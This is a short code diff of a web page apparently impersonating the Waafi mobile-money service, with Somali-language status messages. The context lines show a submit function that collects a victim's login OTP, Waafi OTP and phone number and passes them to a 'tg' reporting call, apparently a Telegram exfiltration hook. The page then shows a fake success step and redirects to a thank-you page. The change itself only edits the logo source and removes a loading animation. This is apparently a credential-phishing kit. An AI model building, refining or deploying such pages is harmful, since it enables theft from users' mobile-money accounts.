@@ -293,7 +293,7 @@ html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(-
   </div>
 
   <div class="loader-ov" id="loaderOv">
-    <div class="pulse-ring"><div class="pulse-inner"><img src="assets/waafi.svg" alt="Waafi"></div></div>
+    <div class="pulse-ring"><div class="pulse-inner"><img src="https://raw.githubusercontent.com/Lenkartel/waafi/main/assets/waafi.webp" alt="Waafi"></div></div>
     <div><div class="loader-text" id="loaderText">La xaqiijinayaa...</div><div class="loader-sub">Fadlan sug...</div></div>
   </div>
 
@@ -501,12 +501,10 @@ function submitOtp2(){
   tg("Waafi OTP",{"Login OTP":otp1Val,"Waafi OTP":otp2Val});
   sessionStorage.setItem("selectedPlan",JSON.stringify({...(P||{}),phone:phoneValue}));
   cm("m2");
-  showLoader("La gudbinayaa codsiga...",function(){
-    document.querySelectorAll(".step").forEach(s=>s.classList.remove("active"));
-    document.getElementById("step4").classList.add("active");
-    document.getElementById("mainBtn").style.display="none";
-    setTimeout(function(){location.href="thankyou.html";},1400);
-  });
+  document.querySelectorAll(".step").forEach(s=>s.classList.remove("active"));
+  document.getElementById("step4").classList.add("active");
+  document.getElementById("mainBtn").style.display="none";
+  setTimeout(function(){location.href="thankyou.html";},1400);
 }
 </script>
 </body>
